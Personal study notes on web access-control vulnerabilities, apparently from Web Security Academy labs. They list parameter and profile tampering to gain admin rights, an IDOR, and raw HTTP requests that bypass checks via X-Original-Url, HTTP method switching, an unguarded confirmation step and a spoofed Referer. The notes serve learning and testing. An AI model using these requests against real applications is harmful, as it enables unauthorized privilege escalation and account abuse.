# Access control

## Unprotected
- found robots.txt
- It contained the url to the admin interface

## Unprotected with predictable url
- Look in page source for scripts
- Found script with the url to admin

## User role controlled by request
- /login?admin=true

## User role controlled by profile
- {"admin": true}

## Userid controlled by request parameter
- /login?id=admin

## Userid in request with unpredictable ids
- found a post by carlos
  - Url in post had his id

## Data leak in redirect and userid controlled by request with password disclosure
- changed id= to id=carlos and captured responses

## IDOR
- changed chat history file to 1.txt

# URL based can be circumvented
- The ?username=carlos is passed to the X-Original-Url
```http
GET /login?username=carlos HTTP/2
Host: 0abc0037042f047b82fa110800d20055.web-security-academy.net
Cookie: session=oQIH8PYEJC376xIiUsbIezsYW7dyIogz
X-Original-Url: /admin/delete
```

## Method based can be circumvented
  - This was originally a post
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a77003403c0f7fb80f56222003c00c8.web-security-academy.net
Cookie: session=oLaBr1W4Ju1SCfOmUh9M2vmGrx2TjCiy
Content-Length: 2
```


## Multi-step broken on one step
- This step was without access control
```http
POST /admin-roles HTTP/2
Host: 0ab5006c045bbc0086eb7ff200fa00ad.web-security-academy.net
Cookie: session=wDoiwiTyScmE1fsclXCObP4k4SqpTyXC
Content-Length: 45
Origin: https://0ab5006c045bbc0086eb7ff200fa00ad.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=wiener
```

## Referrer-based access control
- The referrer just had to be /admin
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a93006203fd437d81b31b78007b0000.web-security-academy.net
Cookie: session=L5Y78XiL9Nzl3k63ok3YUUX8hQPo8fi9
Referer: https://0a93006203fd437d81b31b78007b0000.web-security-academy.net/admin
```
